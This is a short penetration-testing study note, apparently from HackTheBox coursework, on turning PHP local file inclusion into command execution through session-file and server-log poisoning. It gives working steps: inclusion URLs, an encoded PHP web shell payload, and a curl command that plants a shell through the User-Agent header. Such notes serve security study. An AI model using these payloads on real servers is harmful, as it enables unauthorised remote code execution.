Any of the function with execute privileges from the table at the end of [[Attacks/Web/File Inclusion/Local File Inclusion (LFI)/Intro]] should be vulnerable to this attack.

## PHP Session Poisoning

the PHPSESSID cookies, which hold specific user data stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows, The name of the file which contains are user data is our PHPSESSID prefixed with `sess_`.

If we have PHPSESSID cookie we can try to include this session file:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID value>
```

We need to look for a value which we have control over, which we can specify through a parameter.

Try to send a custom value:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now include the session file again to look for the change.

Write a web shell to the file:
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Include the session file and execute commands:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

## Server Log Poisioning

The access.log file contains information of requests, including User-Agent, Since we can control the User-Agent Header we can use it to poison the server logs like above.

Logs in Nginx and in older versions of Apache or misconfigured have read access to low privileged users by default.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.

We can use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for the log locations if they are not in the mentioned locations.

We can use burp or cURL to send a request with a different User-Agent:
```shell-session
Wildland4958@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Now we can include the access log file and execute commands.

Note: The `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50) also store the User-Agent.

Some other logs we might be able to exploit:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

For example with SSH and mail we can poison the username.

[LogPoisoner](https://github.com/nickpupp0/LogPoisoner): Log Poisoning tool.